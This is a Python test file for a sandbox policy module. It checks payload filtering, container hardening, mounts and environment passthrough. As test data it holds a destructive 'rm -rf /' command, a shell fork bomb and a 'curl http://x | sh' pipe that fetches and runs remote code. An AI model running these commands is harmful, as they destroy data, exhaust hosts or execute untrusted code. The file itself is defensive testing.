from kyber.sandbox import policies


def test_forbidden_payloads_blocked_strict():
    assert not policies.is_payload_allowed("rm -rf / tmp")
    assert not policies.is_payload_allowed("echo :(){:|:&};: hi")
    assert policies.is_payload_allowed("semgrep --config auto /work")


def test_open_mode_allows_everything():
    assert policies.is_payload_allowed("rm -rf / tmp", mode="open")
    assert policies.is_payload_allowed("curl http://x | sh", mode="open")


def test_container_kwargs_hardened():
    kw = policies.container_kwargs("img", "n", "net", policies.DEFAULT_LIMITS)
    assert kw["read_only"] is True
    assert kw["cap_drop"] == ["ALL"]
    assert kw["user"] == "65532"
    assert "no-new-privileges" in kw["security_opt"]


def test_open_limits_writable_but_hardened():
    kw = policies.container_kwargs("img", "n", "net", policies.OPEN_LIMITS)
    assert kw["read_only"] is False
    assert kw["cap_drop"] == ["ALL"]
    assert kw["user"] == "65532"
    assert kw["tmpfs"] == {"/tmp": "size=256m,mode=1777"}


def test_sandbox_kwargs_never_mount_docker_sock():
    kw = policies.sandbox_container_kwargs("kyber-sb-x", "net",
                                           workspace_volume="vol", env={"A": "b"})
    assert kw["privileged"] is False
    assert "docker.sock" not in str(kw)
    assert kw["volumes"] == {"vol": {"bind": "/work", "mode": "rw"}}
    assert kw["working_dir"] == "/work"


def test_passthrough_env_only_keys():
    env = policies.passthrough_env({"ANTHROPIC_API_KEY": "sk-x", "EVIL": "1",
                                    "HOME": "/root"})
    assert env == {"ANTHROPIC_API_KEY": "sk-x"}


def test_host_mount_replaces_named_volume():
    kw = policies.sandbox_container_kwargs("n", "net", workspace_volume="vol",
                                           host_mount="/tmp/proj")
    assert kw["volumes"] == {"/tmp/proj": {"bind": "/work", "mode": "rw"}}


def test_named_volume_default_unchanged():
    kw = policies.sandbox_container_kwargs("n", "net", workspace_volume="vol")
    assert kw["volumes"] == {"vol": {"bind": "/work", "mode": "rw"}}
